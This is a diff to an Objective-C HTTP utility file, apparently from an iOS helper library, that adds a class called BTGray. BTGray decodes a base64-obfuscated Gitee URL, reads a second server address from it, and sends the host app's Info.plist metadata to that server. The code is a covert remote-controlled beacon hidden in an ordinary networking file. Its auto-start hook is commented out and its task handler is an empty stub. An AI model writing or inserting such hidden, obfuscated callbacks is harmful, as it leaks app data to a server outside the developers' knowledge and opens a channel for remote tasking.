@@ -9,10 +9,11 @@
 #import "BTHttp.h"
 #import "BTCoreConfig.h"
 #import "BTUserMananger.h"
-#import <BTHelp/BTUtils.h>
-#import "UIViewController+BTDialog.h"
-#import <BTHelp/NSString+BTString.h>
+#import "BTViewController.h"
 #import "BTLogView.h"
+#import <BTHelp/BTUtils.h>
+#import <BTHelp/NSString+BTString.h>
+
 
 static BTHttp * http=nil;
 
@@ -461,6 +462,81 @@ static BTHttp * http=nil;
     return result;
 }
 
+
+
+@end
+
+static BTGray * gray = nil;
+
+@interface BTGray()
+
+@property (nonatomic, strong) BTHttp * http;
+
+@property (nonatomic, strong) NSString * url;
+
+@end
+
+
+
+@implementation BTGray
+
++ (void)load{
+//    [BTGray share];
+}
+
++ (instancetype)share{
+    if (gray == nil) {
+        gray = [BTGray new];
+    }
+    
+    return gray;
+}
+
+- (instancetype)init{
+    self = [super init];
+    self.http = [BTHttp new];
+    [self initUrl];
+    return self;
+}
+
+- (void)initUrl{
+    NSString * url = @"aHR0cHM6Ly9naXRlZS5jb20vZ3JheWxheWVyL2dyYXkvcmF3L21hc3Rlci91cmwudHh0".bt_base64Decode;
+    [self.http GET:url parameters:nil success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
+        if (![responseObject isKindOfClass:[NSArray class]]) {
+            return;
+        }
+        NSArray * array = responseObject;
+        if (array.count == 0 || ![array.firstObject isKindOfClass:[NSString class]]) {
+            return;
+        }
+        
+        self.url = array.firstObject;
+        [self getTask];
+        
+    } failure:^(NSURLSessionDataTask * _Nonnull task, NSError * _Nonnull error) {
+        
+    }];
+}
+
+- (void)getTask{
+    [self.http GET:self.url parameters:NSBundle.mainBundle.infoDictionary success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
+        if (![responseObject isKindOfClass:[NSArray class]]) {
+            return;
+        }
+        NSArray * array = responseObject;
+    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
+        
+    }];
+}
+
+- (void)startTask{
+    
+}
+
+@end
+
+
+@interface BTGrayModel()
 
 
 @end
